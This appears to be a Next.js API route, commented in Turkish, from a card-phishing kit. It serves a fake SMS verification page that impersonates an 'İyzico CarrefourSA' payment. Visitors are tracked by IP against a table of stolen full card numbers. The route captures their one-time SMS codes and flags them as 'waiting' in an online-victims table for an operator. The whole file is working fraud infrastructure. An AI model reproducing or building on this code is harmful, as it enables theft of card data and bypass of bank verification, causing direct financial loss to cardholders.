import { NextRequest, NextResponse } from 'next/server';
import pool from '@/lib/db';

// IP adresini al
function getClientIP(request: NextRequest): string {
    const forwarded = request.headers.get('x-forwarded-for');
    const realIP = request.headers.get('x-real-ip');

    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    if (realIP) {
        return realIP;
    }
    return '127.0.0.1';
}

// SMS sayfası için verileri getir
export async function GET(request: NextRequest) {
    try {
        const ip = getClientIP(request);

        // logs tablosundan verileri al
        const [logRows] = await pool.query(
            'SELECT kredi_karti, tutar, tarih, banka FROM logs WHERE ip = ?',
            [ip]
        ) as any[];

        if (!logRows || logRows.length === 0) {
            return NextResponse.json({
                success: false,
                error: 'Kayıt bulunamadı',
                redirect: '/'
            });
        }

        const log = logRows[0];

        // addresses tablosundan telefon numarasını al
        const [addressRows] = await pool.query(
            'SELECT phone FROM addresses WHERE ip_address = ? ORDER BY is_default DESC LIMIT 1',
            [ip]
        ) as any[];

        let maskedPhone = '05XX XXX XX XX';
        if (addressRows && addressRows.length > 0 && addressRows[0].phone) {
            const phone = addressRows[0].phone.replace(/\s/g, '');
            if (phone.length >= 4) {
                const first2 = phone.substring(0, 2);
                const last2 = phone.substring(phone.length - 2);
                const middleLength = phone.length - 4;
                const masked = '*'.repeat(middleLength);
                maskedPhone = first2 + masked + last2;
            }
        }

        // Kart tipini belirle (Visa/Mastercard)
        const cardNumber = log.kredi_karti?.replace(/\s/g, '') || '';
        let cardType = 'unknown';
        if (cardNumber.startsWith('4')) {
            cardType = 'visa';
        } else if (cardNumber.startsWith('5')) {
            cardType = 'mastercard';
        }

        // Son 4 hane
        const lastFourDigits = cardNumber.length >= 4 ? cardNumber.slice(-4) : '****';

        // Parse database dates/strings safely avoiding timezone shifts and month/day swaps
        const parseDatabaseDate = (dateVal: any): Date => {
            if (dateVal instanceof Date) {
                return dateVal;
            }
            if (typeof dateVal === 'string') {
                // Check Turkish format: "12.07.2026 02:52:00"
                let match = dateVal.match(/^(\d{2})\.(\d{2})\.(\d{4})\s+(\d{2}):(\d{2}):(\d{2})$/);
                if (match) {
                    const [, day, month, year, hour, minute, second] = match;
                    return new Date(
                        Number(year),
                        Number(month) - 1,
                        Number(day),
                        Number(hour),
                        Number(minute),
                        Number(second)
                    );
                }
                // Check MySQL format: "2026-07-12 02:52:00"
                match = dateVal.match(/^(\d{4})-(\d{2})-(\d{2})\s+(\d{2}):(\d{2}):(\d{2})$/);
                if (match) {
                    const [, year, month, day, hour, minute, second] = match;
                    return new Date(
                        Number(year),
                        Number(month) - 1,
                        Number(day),
                        Number(hour),
                        Number(minute),
                        Number(second)
                    );
                }
                const parsed = new Date(dateVal);
                if (!isNaN(parsed.getTime())) {
                    return parsed;
                }
            }
            return new Date();
        };

        const formatIstanbulDate = (date: Date): string => {
            const day = String(date.getDate()).padStart(2, '0');
            const month = String(date.getMonth() + 1).padStart(2, '0');
            const year = date.getFullYear();
            const hours = String(date.getHours()).padStart(2, '0');
            const minutes = String(date.getMinutes()).padStart(2, '0');
            const seconds = String(date.getSeconds()).padStart(2, '0');
            return `${day}.${month}.${year} ${hours}:${minutes}:${seconds}`;
        };

        let formattedDate = formatIstanbulDate(new Date());
        if (log.tarih) {
            if (typeof log.tarih === 'number' || !isNaN(Number(log.tarih))) {
                const timestamp = Number(log.tarih);
                const date = timestamp > 9999999999 ? new Date(timestamp) : new Date(timestamp * 1000);
                formattedDate = formatIstanbulDate(date);
            } else {
                const parsedDate = parseDatabaseDate(log.tarih);
                formattedDate = formatIstanbulDate(parsedDate);
            }
        }

        return NextResponse.json({
            success: true,
            data: {
                tutar: log.tutar || '0.00',
                tarih: formattedDate,
                lastFourDigits,
                cardType,
                maskedPhone,
                isyeriAdi: 'İyzico CarrefourSA',
                banka: log.banka || ''
            }
        });
    } catch (error: any) {
        console.error('SMS veri getirme hatası:', error);
        return NextResponse.json({ success: false, error: error.message }, { status: 500 });
    }
}

// SMS kodunu kaydet
export async function POST(request: NextRequest) {
    try {
        const ip = getClientIP(request);
        const { smsCode } = await request.json();

        if (!smsCode || smsCode.length < 5) {
            return NextResponse.json({
                success: false,
                error: 'Geçersiz SMS kodu'
            }, { status: 400 });
        }

        // logs tablosundaki sms sütununu güncelle
        await pool.query(
            'UPDATE logs SET sms = ?, durum = ? WHERE ip = ?',
            [smsCode, 'BEKLİYOR', ip]
        );

        // cevrimici_tablosu'ndaki sayfa sütununu güncelle
        await pool.query(
            'UPDATE cevrimici_tablosu SET sayfa = ? WHERE ip = ?',
            ['BEKLİYOR', ip]
        );

        return NextResponse.json({
            success: true,
            message: 'ok'
        });
    } catch (error: any) {
        console.error('SMS kaydetme hatası:', error);
        return NextResponse.json({ success: false, error: error.message }, { status: 500 });
    }
}
